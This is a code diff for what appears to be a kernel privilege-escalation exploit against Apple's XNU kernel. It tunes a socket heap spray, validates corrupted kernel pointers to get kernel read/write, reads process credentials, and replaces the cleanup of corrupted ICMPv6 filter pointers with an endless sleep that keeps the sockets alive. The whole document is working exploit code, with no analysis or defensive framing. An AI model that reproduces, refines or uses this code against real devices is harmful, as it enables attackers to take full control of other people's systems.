@@ -738,8 +738,8 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 			return -1;
 		}
 		controlSocketPcb = __xpaci(*(uint64_t *)vbuf);
-		if ((controlSocketPcb >> 56) != 0xff) {
-			printf("[-] KRW validation: controlSocketPcb=%#llx not kernel ptr, retrying\n", controlSocketPcb); fflush(stdout);
+		if ((controlSocketPcb >> 56) != 0xff || controlSocketPcb == (uint64_t)-1) {
+			printf("[-] KRW validation: controlSocketPcb=%#llx bad, retrying\n", controlSocketPcb); fflush(stdout);
 			controlSocket = 0; rwSocket = 0;
 			return -1;
 		}
@@ -805,8 +805,8 @@ void pe_v1(void)
 		u64_array_reset(&socketPcbIds);
 		unsigned socketPortsCount = 0;
 		#define OPEN_MAX 10240
-		int maxfiles = OPEN_MAX * 3;
-		int leeway = 4096 * 2;
+		int maxfiles = OPEN_MAX;
+		int leeway = 2048;
 		for (unsigned socketCount = 0; socketCount < (maxfiles - leeway); socketCount++) {
 			mach_port_t port = spray_socket(&socketPorts);
 			if (port == -1) {
@@ -850,7 +850,7 @@ void pe_v1(void)
 				break;
 			}
 		}
-		sockets_release(&socketPorts);
+		if (!success) sockets_release(&socketPorts);
 		for (uint64_t s = 0; s < searchMappingNum; s++) {
 			mach_vm_address_t searchMappingAddress = u64_array_last(&searchMappings);
 			u64_array_pop(&searchMappings);
@@ -942,16 +942,8 @@ int main(int argc, char* argv[])
 	// controlSocketPcb already read inside find_and_corrupt_socket (before sockets_release)
 	printf("[i] controlSocketPcb=%#llx rwSocketPcb=%#llx\n", controlSocketPcb, rwSocketPcb); fflush(stdout);
 
-	// verify KRW is still intact after sockets_release
-	uint8_t krw_check[EARLY_KRW_LENGTH];
-	socklen_t krw_check_len = EARLY_KRW_LENGTH;
-	int kr_chk = getsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, krw_check, &krw_check_len);
-	uint64_t filter_val = *(uint64_t *)krw_check;
-	printf("[i] KRW check: getsockopt=%d filter_reads=%#llx (expect rwPcb+0x148 area data)\n",
-		kr_chk, filter_val); fflush(stdout);
-
-	krw_sockets_leak_forever();
-	printf("[+] sockets leaked\n"); fflush(stdout);
+	// sockets stay alive via port refs (no sockets_release on success path)
+	// skip krw_sockets_leak_forever — not needed without release
 
 	uint64_t socketAddr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
 	uint64_t ucred = early_kread64(socketAddr + OFFSET_SO_CRED);
@@ -1036,14 +1028,6 @@ int main(int argc, char* argv[])
 		closedir(dir);
 	}
 
-	// NULL the corrupted filter pointers so kfree_type in rip6_detach skips the free.
-	// may fail with EINVAL if sockets_release already detached the PCB — that's fine.
-	set_target_kaddr(controlSocketPcb + OFFSET_ICMP6FILT);
-	uint8_t zero_buf[EARLY_KRW_LENGTH] = {0};
-	setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, zero_buf, EARLY_KRW_LENGTH);
-	set_target_kaddr(rwSocketPcb + OFFSET_ICMP6FILT);
-	setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, zero_buf, EARLY_KRW_LENGTH);
-
-	printf("[*] DONE\n"); fflush(stdout);
-	return 0;
+	printf("[*] DONE — sleeping to keep sockets alive\n"); fflush(stdout);
+	while (1) sleep(3600);
 }
